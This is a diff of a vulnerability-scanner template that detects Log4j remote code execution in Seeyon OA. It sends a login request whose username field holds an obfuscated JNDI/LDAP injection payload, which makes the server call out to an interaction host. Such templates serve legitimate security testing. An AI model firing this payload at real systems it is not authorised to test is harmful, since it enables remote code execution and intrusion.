@@ -1,4 +1,5 @@
-id: seeyon-oa-log4j-rce
+id: seeyon-oa-log4j
+
 info:
   name: Seeyon OA (Log4j) - Remote Code Execution
   author: SleepingBag945
@@ -16,26 +17,28 @@ info:
     cwe-id: CWE-77
     cpe: cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*
   metadata:
-    runzero-review: REJECT/2025-11-07/uses interactsh
-    fofa-query: app="致远互联-OA"
+    verified: true
     max-request: 1
+    fofa-query: app="致远互联-OA"
     product: log4j
     vendor: apache
-    verified: true
-  tags: cve,cve2021,jndi,kev,log4j,oast,rce,seeyon-oa,vuln
+  tags: cve,cve2021,rce,jndi,log4j,seeyon-oa,kev,oast
+
 http:
-  - matchers:
-      - condition: and
-        dsl:
-          - len(body) == 0
-          - status_code == 302
-          - contains(interactsh_protocol, "dns")
-          - contains(tolower(header), '/seeyon/main.do')
-        type: dsl
-    raw:
+  - raw:
       - |
         POST /seeyon/main.do?method=login HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
         authorization=&login.timezone=GMT+8:00&province=&city=&rectangle=&login_username=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{interactsh-url}}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "len(body) == 0"
+          - "status_code == 302"
+          - 'contains(interactsh_protocol, "dns")'
+          - "contains(tolower(header), '/seeyon/main.do')"
+        condition: and
+# digest: 490a0046304402205fa237518f299b5a606a7b4b715654152e02fb63974dac14f555869089747378022017d6d53603a31c498f5a7beca81c84a7e74d63611ffedbaa9fac1d3b5f0cc206:922c64590222798bb761d5b6d8e72950
